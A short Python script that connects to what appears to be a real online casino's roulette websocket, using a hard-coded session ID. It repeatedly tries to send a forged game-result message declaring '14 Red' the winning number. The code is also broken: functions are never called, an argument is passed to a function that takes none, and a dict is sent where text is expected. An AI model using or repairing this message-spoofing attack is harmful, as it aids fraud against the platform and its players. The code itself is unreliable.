import websockets, asyncio

for x in range(150):
        x=1
        async def Forward():
                url = 'wss://bwl.evo-games.com/public/chat/table/48z5pjps3ntvqc1b/player/socket?EVOSESSIONID=q6chrzpr5d43bg65rxgn2rcnnkyjiqnd32e8fb003b3afd4c3eb1a3a62f38facb79c27c1eecde7d40&client_version=6.20240220.63441.39066-ba9705dd2c'
                async with websockets.connect(url) as websocket:
                        await websocket.send({"id":"1708238318356-2488","type":"roulette.winSpots","args":{"gameId":"17b2c2acd03a628a7a4a9bf3","code":"14","description":"14 Red","winSpots":{},"timestamp":"2024-02-21T18:34:55.265Z","result":[{"number":"14"}]},"time":1708238318356})
        def xmit_Loop():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(Forward({"id":"1708238318356-2488","type":"roulette.winSpots","args":{"gameId":"17b2c2acd03a628a7a4a9bf3","code":"14","description":"14 Red","winSpots":{},"timestamp":"2024-02-21T18:34:55.265Z","result":[{"number":"14"}]},"time":1708238318356}))

        x=x+1

